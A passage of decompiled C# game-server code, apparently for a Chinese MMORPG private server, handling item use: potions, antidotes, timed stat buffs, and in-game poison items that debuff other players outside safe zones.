						while (num93 < array9.Length)
						{
							if (int.Parse(array9[num93]) == base.人物坐标_地图)
							{
								return;
							}
							int num84 = num93 + 1;
							num93 = num84;
						}
					}
					坐标Class value22 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					if (土灵符坐标.ContainsKey(1))
					{
						土灵符坐标.Remove(1);
					}
					土灵符坐标.Add(1, value22);
					移动(0f, 0f, 15f, 26100);
					物品使用(num13, num24, 1);
					return;
				}
				case 1000000714:
					升天武功点数++;
					物品使用(num13, num24, 1);
					更新武功和状态();
					return;
				case 999000764:
					new Random();
					base.累计充值 += RNG.Next(1, 6);
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				case 1000000769:
					升天武功点数 += 3000;
					物品使用(num13, num24, 1);
					更新武功和状态();
					break;
				case 1000000717:
					爆毒状态 = 0.01;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000718:
					爆毒状态 = 0.012;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000719:
					爆毒状态 = 0.014;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000720:
					爆毒状态 = 0.016;
					物品使用(num13, num24, 1);
					爆毒数据包(num24);
					return;
				case 1000000815:
					if (异常状态.ContainsKey(13) || (异常状态.ContainsKey(1) ? true : false))
					{
						if (异常状态.ContainsKey(13))
						{
							异常状态[13].时间结束事件();
						}
						if (异常状态.ContainsKey(1))
						{
							异常状态[1].时间结束事件();
						}
						物品使用(num13, num24, 1);
						更新武功和状态();
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000816:
					if (异常状态.ContainsKey(14))
					{
						异常状态[14].时间结束事件();
						物品减去属性数量(num24, 1);
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000818:
				case 1000000819:
					return;
				case 1000000820:
					if (异常状态.ContainsKey(20))
					{
						异常状态类 异常状态类6 = new 异常状态类(this, 1000, 20, 0.0);
						异常状态[20].时间结束事件();
						物品减去属性数量(num24, 1);
						更新武功和状态();
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000821:
					if (异常状态.ContainsKey(16) || (异常状态.ContainsKey(15) ? true : false))
					{
						if (异常状态.ContainsKey(16))
						{
							异常状态[16].时间结束事件();
						}
						if (异常状态.ContainsKey(15))
						{
							异常状态[15].时间结束事件();
						}
						物品减去属性数量(num24, 1);
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000826:
					if (异常状态.ContainsKey(19))
					{
						异常状态[19].时间结束事件();
						物品减去属性数量(num24, 1);
						更新武功和状态();
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000830:
				{
					int num53 = 1200000;
					if (追加状态列表.ContainsKey(1000000830))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000830), 1, num53);
					追加状态类 追加状态类75 = new 追加状态类(this, num53, 1000000830, 1);
					追加状态列表.Add(追加状态类75.FLD_PID, 追加状态类75);
					base.人物追加最大_HP += 100;
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000000831:
				{
					int num48 = 1800000;
					if (追加状态列表.ContainsKey(1000000831))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000831), 1, num48);
					追加状态类 追加状态类65 = new 追加状态类(this, num48, 1000000831, 1);
					追加状态列表.Add(追加状态类65.FLD_PID, 追加状态类65);
					base.人物追加最大_HP += 50;
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000000832:
				{
					int num50 = 600000;
					if (追加状态列表.ContainsKey(1000000832))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000832), 1, num50);
					追加状态类 追加状态类66 = new 追加状态类(this, num50, 1000000832, 1);
					追加状态列表.Add(追加状态类66.FLD_PID, 追加状态类66);
					base.人物追加最大_HP += 100;
					base.人物追加最大_MP += 100;
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000001509:
				{
					Random random2 = new Random();
					int chnum = random2.Next(1, 10);
					base.累计充值 += chnum;
					更新武功和状态();
					物品使用(num13, num24, 1);
					系统提示("称号点增加【" + chnum + "】", 10, "称号点");
					SavePlayerData();
					break;
				}
				case 1000000833:
				{
					int num51 = 600000;
					if (追加状态列表.ContainsKey(1000000833) || (追加状态列表.ContainsKey(1000000834) ? true : false))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000833), 1, num51);
					追加状态类 追加状态类67 = new 追加状态类(this, num51, 1000000833, 1);
					追加状态列表.Add(追加状态类67.FLD_PID, 追加状态类67);
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000000834:
				{
					int num33 = 600000;
					if (追加状态列表.ContainsKey(1000000834) || (追加状态列表.ContainsKey(1000000833) ? true : false))
					{
						return;
					}
					状态效果(BitConverter.GetBytes(1000000834), 1, num33);
					追加状态类 追加状态类43 = new 追加状态类(this, num33, 1000000834, 1);
					追加状态列表.Add(追加状态类43.FLD_PID, 追加状态类43);
					计算人物装备数据();
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1000000835:
					if (base.Player_Sex == 2)
					{
						int num27 = 600000;
						if (追加状态列表.ContainsKey(1000000835))
						{
							return;
						}
						状态效果(BitConverter.GetBytes(1000000835), 1, num27);
						追加状态类 追加状态类27 = new 追加状态类(this, num27, 1000000835, 1);
						追加状态列表.Add(追加状态类27.FLD_PID, 追加状态类27);
						base.FLD_追加百分比_MP上限 += 0.05;
						计算人物装备数据();
						更新武功和状态();
						物品使用(num13, num24, 1);
					}
					else
					{
						系统提示("此药为女性专用药！", 10, "吃药提示");
					}
					break;
				case 1000000836:
					if (base.Player_Sex == 2)
					{
						int num21 = 600000;
						if (追加状态列表.ContainsKey(1000000836))
						{
							return;
						}
						状态效果(BitConverter.GetBytes(1000000836), 1, num21);
						追加状态类 追加状态类25 = new 追加状态类(this, num21, 1000000836, 1);
						追加状态列表.Add(追加状态类25.FLD_PID, 追加状态类25);
						base.FLD_追加百分比_HP上限 += 0.05;
						计算人物装备数据();
						更新武功和状态();
						物品使用(num13, num24, 1);
					}
					else
					{
						系统提示("此药为女性专用药！", 10, "吃药提示");
					}
					break;
				case 1008000164:
					CheckTreasureGems();
					检察抽奖数据(1, 1, "抽奖卡");
					SaveGemData();
					物品使用(num13, num24, 1);
					break;
				case 1000000837:
					加魔(1200);
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000838:
					加血(1200);
					物品使用(num13, num24, 1);
					吃药效果(num49);
					break;
				case 1000000839:
					if (异常状态.ContainsKey(13) || 异常状态.ContainsKey(9) || 异常状态.ContainsKey(14) || 异常状态.ContainsKey(13) || 异常状态.ContainsKey(1) || 异常状态.ContainsKey(2) || 异常状态.ContainsKey(17) || 异常状态.ContainsKey(18) || 异常状态.ContainsKey(26) || 异常状态.ContainsKey(20) || (异常状态.ContainsKey(16) ? true : false))
					{
						异常状态列表();
						物品使用(num13, num24, 1);
						更新武功和状态();
					}
					else
					{
						系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
					}
					break;
				case 1000000841:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players8 = World.检查玩家世界ID(num36);
					if (players8 != null && ((num36 != base.人物全服ID) ? true : false) && !players8.异常状态.ContainsKey(12))
					{
						double num100 = (double)players8.人物_HP * 0.1;
						异常状态类 value27 = new 异常状态类(players8, 1000, 12, 0.0);
						players8.异常状态.Add(12, value27);
						players8.人物_HP -= players8.人物_HP / 10;
						players8.更新HP_MP_SP();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000842:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players5 = World.检查玩家世界ID(num36);
					if (players5 != null && ((num36 != base.人物全服ID) ? true : false) && !players5.异常状态.ContainsKey(1) && ((!players5.异常状态.ContainsKey(13)) ? true : false))
					{
						异常状态类 value19 = new 异常状态类(players5, 60000, 13, 0.1);
						players5.异常状态.Add(13, value19);
						players5.FLD_药品_减少攻击 -= 0.1;
						players5.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000843:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players3 = World.检查玩家世界ID(num36);
					if (players3 != null && ((num36 != base.人物全服ID) ? true : false) && !players3.异常状态.ContainsKey(14))
					{
						异常状态类 value16 = new 异常状态类(players3, 60000, 14, 0.1);
						players3.异常状态.Add(14, value16);
						players3.FLD_药品_减少防御 -= 0.1;
						players3.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000844:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players2 = World.检查玩家世界ID(num36);
					if (players2 != null && ((num36 != base.人物全服ID) ? true : false) && !players2.异常状态.ContainsKey(16))
					{
						double num63 = (double)players2.人物最大_MP * 0.05;
						异常状态类 异常状态类7 = new 异常状态类(players2, 15000, 16, (int)num63, 3000);
						异常状态类7.异常状态类掉蓝(num63);
						players2.异常状态.Add(16, 异常状态类7);
						players2.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000845:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players14 = World.检查玩家世界ID(num36);
					if (players14 != null && ((num36 != base.人物全服ID) ? true : false) && !players14.异常状态.ContainsKey(17))
					{
						players14.异常状态 = new ThreadSafeDictionary<int, 异常状态类>();
						异常状态类 value9 = new 异常状态类(players14, 10000, 17, 0.0);
						players14.异常状态.Add(17, value9);
						players14.人物锁定 = true;
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000846:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players13 = World.检查玩家世界ID(num36);
					NpcClass value5;
					if (players13 != null && ((num36 != base.人物全服ID) ? true : false))
					{
						if (!players13.异常状态.ContainsKey(18))
						{
							异常状态类 异常状态类4 = new 异常状态类(players13, 30000, 18, 100.0, 3000);
							异常状态类4.异常状态类出血红潮散(100.0);
							players13.异常状态.Add(18, 异常状态类4);
							物品使用(num13, num24, 1);
						}
					}
					else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num36, out value5) && !value5.异常状态.ContainsKey(18))
					{
						异常状态类 异常状态类5 = new 异常状态类(value5, base.人物全服ID, 30000, 18, 100.0, 3000);
						异常状态类5.异常状态类出血红潮散(100.0);
						value5.异常状态.TryAdd(18, 异常状态类5);
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000847:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players12 = World.检查玩家世界ID(num36);
					NpcClass value3;
					if (players12 != null && ((num36 != base.人物全服ID) ? true : false))
					{
						if (!players12.异常状态.ContainsKey(18))
						{
							异常状态类 异常状态类2 = new 异常状态类(players12, 30000, 18, 150.0, 3000);
							异常状态类2.异常状态类出血红潮散(150.0);
							players12.异常状态.Add(18, 异常状态类2);
							物品使用(num13, num24, 1);
						}
					}
					else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num36, out value3) && !value3.异常状态.ContainsKey(18))
					{
						异常状态类 异常状态类3 = new 异常状态类(value3, base.人物全服ID, 30000, 18, 150.0, 3000);
						异常状态类3.异常状态类出血红潮散(150.0);
						value3.异常状态.TryAdd(18, 异常状态类3);
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000848:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players10 = World.检查玩家世界ID(num36);
					if (players10 != null && ((num36 != base.人物全服ID) ? true : false) && !players10.异常状态.ContainsKey(15))
					{
						double num17 = (double)players10.人物_MP * 0.1;
						异常状态类 value37 = new 异常状态类(players10, 1000, 15, 0.0);
						players10.异常状态.Add(15, value37);
						players10.人物_MP -= (int)num17;
						players10.更新HP_MP_SP();
						players10.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000849:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players = World.检查玩家世界ID(num36);
					if (players != null && ((num36 != base.人物全服ID) ? true : false) && !players.异常状态.ContainsKey(19))
					{
						异常状态类 value23 = new 异常状态类(players, 20000, 19, 0.0);
						players.异常状态.Add(19, value23);
						players.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000850:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players7 = World.检查玩家世界ID(num36);
					if (players7 != null && ((num36 != base.人物全服ID) ? true : false) && !players7.异常状态.ContainsKey(20))
					{
						异常状态类 value25 = new 异常状态类(players7, 30000, 20, 0.0);
						players7.异常状态.Add(20, value25);
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000909:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players6 = World.检查玩家世界ID(num36);
					if (players6 != null && ((num36 != base.人物全服ID) ? true : false) && !players6.异常状态.ContainsKey(28) && players6.安全模式 == 1)
					{
						异常状态类 value20 = new 异常状态类(players6, 15000, 28, 0.0);
						players6.异常状态.Add(28, value20);
						players6.安全模式 = 0;
						players6.人物锁定 = true;
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000851:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players4 = World.检查玩家世界ID(num36);
					NpcClass value17;
					if (players4 != null && ((num36 != base.人物全服ID) ? true : false))
					{
						if (!players4.异常状态.ContainsKey(18))
						{
							double num66 = (double)players4.人物最大_HP * 0.05;
							异常状态类 异常状态类8 = new 异常状态类(players4, 30000, 18, (int)num66, 3000);
							异常状态类8.异常状态类出血红潮散(num66);
							players4.异常状态.Add(18, 异常状态类8);
							物品使用(num13, num24, 1);
						}
					}
					else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num36, out value17) && !value17.异常状态.ContainsKey(18) && value17.FLD_BOSS == 0)
					{
						double num67 = (double)value17.Max_Rxjh_HP * 0.05;
						异常状态类 异常状态类9 = new 异常状态类(value17, base.人物全服ID, 30000, 18, num67, 3000);
						异常状态类9.异常状态类出血红潮散(num67);
						value17.异常状态.TryAdd(18, 异常状态类9);
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 1000000852:
				{
					if (安全区禁止下毒(this))
					{
						系统提示("泫勃派安全区禁止使用毒药", 10, "下毒提示");
						return;
					}
					Players players16 = World.检查玩家世界ID(num36);
					if (players16 != null && ((num36 != base.人物全服ID) ? true : false) && !players16.异常状态.ContainsKey(1) && ((!players16.异常状态.ContainsKey(13)) ? true : false))
					{
						异常状态类 value10 = new 异常状态类(players16, 60000, 1, 0.2);
						players16.异常状态.Add(1, value10);
						players16.FLD_药品_减少攻击 -= 0.2;
						players16.更新武功和状态();
						物品使用(num13, num24, 1);
					}
					break;
				}
				case 900000747:
				{
					int num6 = 86400000;
					if (追加状态列表.ContainsKey(1008000194) || 追加状态列表.ContainsKey(1008000197) || 追加状态列表.ContainsKey(1008000185) || 追加状态列表.ContainsKey(1008000188) || 追加状态列表.ContainsKey(1008000243) || 追加状态列表.ContainsKey(1008001350) || 追加状态列表.ContainsKey(1008000232) || 追加状态列表.ContainsKey(1008001351) || 追加状态列表.ContainsKey(1008000248) || 追加状态列表.ContainsKey(1008000362) || 追加状态列表.ContainsKey(1008001021))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(2))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(8))
					{
						新吃药提示();
						return;
					}
					追加状态New列表.ContainsKey(5);
					追加状态New列表.ContainsKey(6);
					if (追加状态New列表.ContainsKey(3))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(9))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(1))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(7))
					{
						新吃药提示();
						return;
					}
					追加状态New列表.ContainsKey(5);
					追加状态New列表.ContainsKey(6);
					if (追加状态New列表.ContainsKey(14))
					{
						新吃药提示();
						return;
					}
					Set追加状态物品(2, num6, 20, 2);
					Set追加状态物品(8, num6, 10, 2);
					Set追加状态物品(5, num6, 20, 1);
					Set追加状态物品(6, num6, 20, 1);
					Set追加状态物品(3, num6, 500, 1);
					Set追加状态物品(9, num6, 20, 2);
					Set追加状态物品(1, num6, 20, 2);
					Set追加状态物品(7, num6, 15, 2);
					Set追加状态物品(5, num6, 20, 1);
					Set追加状态物品(6, num6, 20, 1);
					Set追加状态物品(14, num6, 2, 1);
					状态效果(BitConverter.GetBytes(1008000194), 1, num6);
					追加状态类 追加状态类4 = new 追加状态类(this, num6, 1008000194, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.人物追加最大_HP += 1000;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008001814), 1, num6);
					追加状态类4 = new 追加状态类(this, num6, 1008001814, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.FLD_追加百分比_攻击 += 0.28;
					base.FLD_人物_追加_攻击 += 80;
					base.FLD_追加百分比_防御 += 0.3;
					base.FLD_人物_追加_防御 += 80;
					base.人物追加最大_HP += 3000;
					base.FLD_人物_武功攻击力增加百分比 += 0.35;
					base.FLD_人物_武功防御力增加百分比 += 0.23;
					base.FLD_人物_追加_经验百分比 += 2.1;
					base.FLD_人物_追加_吸魂几率百分比 += 10.0;
					妖花青草 = true;
					状态效果(BitConverter.GetBytes(1008001112), 1, num6);
					追加状态类4 = new 追加状态类(this, num6, 1008001112, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.人物追加最大_HP += 800;
					base.FLD_人物_追加_回避 += 10;
					base.FLD_人物_追加_武功防御力 += 100.0;
					base.FLD_人物_追加_攻击 += 100;
					base.FLD_人物_追加_防御 += 50;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008000195), 1, num6);
					追加状态类4 = new 追加状态类(this, num6, 1008000195, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.人物追加最大_HP += 300;
					addFLD_追加百分比_防御(0.05);
					base.FLD_人物_追加_气功++;
					状态效果(BitConverter.GetBytes(1008000243), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000243, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					addFLD_追加百分比_攻击(0.2);
					addFLD_追加百分比_防御(0.2);
					base.人物追加最大_HP += 200;
					base.FLD_人物_追加_经验百分比 += 0.15;
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					状态效果(BitConverter.GetBytes(1008000197), 1, num6);
					追加状态类4 = new 追加状态类(this, num6, 1008000197, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.人物追加最大_HP += 700;
					addFLD_追加百分比_防御(0.1);
					addFLD_追加百分比_攻击(0.1);
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(BitConverter.GetBytes(1008000185), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000185, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.人物追加最大_HP += 700;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_追加_历练百分比 += 2.0;
					addFLD_追加百分比_防御(0.1);
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(BitConverter.GetBytes(1008000188), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000188, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.人物追加最大_HP += 300;
					base.人物追加最大_MP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008000232), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000232, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_获得游戏币百分比 += 0.4;
					base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
					状态效果(BitConverter.GetBytes(1008000248), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000248, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.FLD_人物_追加_经验百分比 += 1.0;
					base.FLD_人物_追加_历练百分比 += 1.0;
					base.FLD_人物_追加_获得游戏币百分比 += 1.0;
					base.FLD_人物_追加_物品掉落概率百分比 += 1.0;
					状态效果(BitConverter.GetBytes(1008000362), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008000362, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.FLD_人物_追加_经验百分比 += 1.5;
					状态效果(BitConverter.GetBytes(1008001021), 1, num6 += 3000);
					追加状态类4 = new 追加状态类(this, num6, 1008001021, 1);
					追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
					base.FLD_人物_追加_气功 += 3;
					base.人物追加最大_HP += 500;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					物品使用(num13, num24, 1);
					更新广播人物数据();
					计算人物装备数据();
					更新武功和状态();
					更新经验和历练();
					物品减去属性数量(num, 1);
					更新武功和状态();
					更新广播人物数据();
					更新人物数据(this);
					更新装备效果();
					break;
				}
				case 900000731:
				{
					int num92 = 28800000;
					if (追加状态列表.ContainsKey(1008000194) || 追加状态列表.ContainsKey(1008000197) || 追加状态列表.ContainsKey(1008000185) || 追加状态列表.ContainsKey(1008000188) || 追加状态列表.ContainsKey(1008000243) || 追加状态列表.ContainsKey(1008001350) || 追加状态列表.ContainsKey(1008000232) || 追加状态列表.ContainsKey(1008001351) || 追加状态列表.ContainsKey(1008000248) || 追加状态列表.ContainsKey(1008000362) || 追加状态列表.ContainsKey(1008001021))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.Count > 0)
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(2))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(8))
					{
						新吃药提示();
						return;
					}
					追加状态New列表.ContainsKey(5);
					追加状态New列表.ContainsKey(6);
					if (追加状态New列表.ContainsKey(3))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(9))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(1))
					{
						新吃药提示();
						return;
					}
					if (追加状态New列表.ContainsKey(7))
					{
						新吃药提示();
						return;
					}
					追加状态New列表.ContainsKey(5);
					追加状态New列表.ContainsKey(6);
					追加状态New列表.ContainsKey(11);
					if (追加状态New列表.ContainsKey(14))
					{
						新吃药提示();
						return;
					}
					Set追加状态物品(2, num92, 20, 2);
					Set追加状态物品(8, num92, 10, 2);
					Set追加状态物品(5, num92, 20, 1);
					Set追加状态物品(6, num92, 20, 1);
					Set追加状态物品(3, num92, 500, 1);
					Set追加状态物品(9, num92, 20, 2);
					Set追加状态物品(1, num92, 20, 2);
					Set追加状态物品(7, num92, 15, 2);
					Set追加状态物品(5, num92, 20, 1);
					Set追加状态物品(6, num92, 20, 1);
					Set追加状态物品(14, num92, 2, 1);
					状态效果(BitConverter.GetBytes(1008000194), 1, num92);
					追加状态类 追加状态类97 = new 追加状态类(this, num92, 1008000194, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.人物追加最大_HP += 1000;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008001814), 1, num92);
					追加状态类97 = new 追加状态类(this, num92, 1008001814, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.FLD_追加百分比_攻击 += 0.28;
					base.FLD_人物_追加_攻击 += 80;
					base.FLD_追加百分比_防御 += 0.3;
					base.FLD_人物_追加_防御 += 80;
					base.人物追加最大_HP += 3000;
					base.FLD_人物_武功攻击力增加百分比 += 0.35;
					base.FLD_人物_武功防御力增加百分比 += 0.23;
					base.FLD_人物_追加_经验百分比 += 2.1;
					base.FLD_人物_追加_吸魂几率百分比 += 10.0;
					妖花青草 = true;
					状态效果(BitConverter.GetBytes(1008001112), 1, num92);
					追加状态类97 = new 追加状态类(this, num92, 1008001112, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.人物追加最大_HP += 800;
					base.FLD_人物_追加_回避 += 10;
					base.FLD_人物_追加_武功防御力 += 100.0;
					base.FLD_人物_追加_攻击 += 100;
					base.FLD_人物_追加_防御 += 50;
					base.FLD_人物_武功攻击力增加百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008000195), 1, num92);
					追加状态类97 = new 追加状态类(this, num92, 1008000195, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.人物追加最大_HP += 300;
					addFLD_追加百分比_防御(0.05);
					base.FLD_人物_追加_气功++;
					状态效果(BitConverter.GetBytes(1008000243), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000243, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					addFLD_追加百分比_攻击(0.2);
					addFLD_追加百分比_防御(0.2);
					base.人物追加最大_HP += 200;
					base.FLD_人物_追加_经验百分比 += 0.15;
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					状态效果(BitConverter.GetBytes(1008000197), 1, num92);
					追加状态类97 = new 追加状态类(this, num92, 1008000197, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.人物追加最大_HP += 700;
					addFLD_追加百分比_防御(0.1);
					addFLD_追加百分比_攻击(0.1);
					base.FLD_人物_武功攻击力增加百分比 += 0.05;
					base.FLD_人物_武功防御力增加百分比 += 0.1;
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(BitConverter.GetBytes(1008000185), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000185, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.人物追加最大_HP += 700;
					base.FLD_人物_追加_经验百分比 += 0.4;
					base.FLD_人物_追加_历练百分比 += 2.0;
					addFLD_追加百分比_防御(0.1);
					addFLD_装备_追加_防具_强化(1);
					addFLD_装备_追加_武器_强化(2);
					状态效果(BitConverter.GetBytes(1008000188), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000188, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					addFLD_追加百分比_攻击(0.15);
					addFLD_追加百分比_防御(0.15);
					base.人物追加最大_HP += 300;
					base.人物追加最大_MP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					状态效果(BitConverter.GetBytes(1008000232), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000232, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.人物追加最大_HP += 300;
					base.FLD_人物_追加_经验百分比 += 0.1;
					base.FLD_人物_追加_获得游戏币百分比 += 0.4;
					base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
					状态效果(BitConverter.GetBytes(1008000248), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000248, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.FLD_人物_追加_经验百分比 += 1.0;
					base.FLD_人物_追加_历练百分比 += 1.0;
					base.FLD_人物_追加_获得游戏币百分比 += 1.0;
					base.FLD_人物_追加_物品掉落概率百分比 += 1.0;
					状态效果(BitConverter.GetBytes(1008000362), 1, num92 += 3000);
					追加状态类97 = new 追加状态类(this, num92, 1008000362, 1);
					追加状态列表.Add(追加状态类97.FLD_PID, 追加状态类97);
					base.FLD_人物_追加_经验百分比 += 1.5;
					状态效果(BitConverter.GetBytes(1008001021), 1, num92 += 3000);
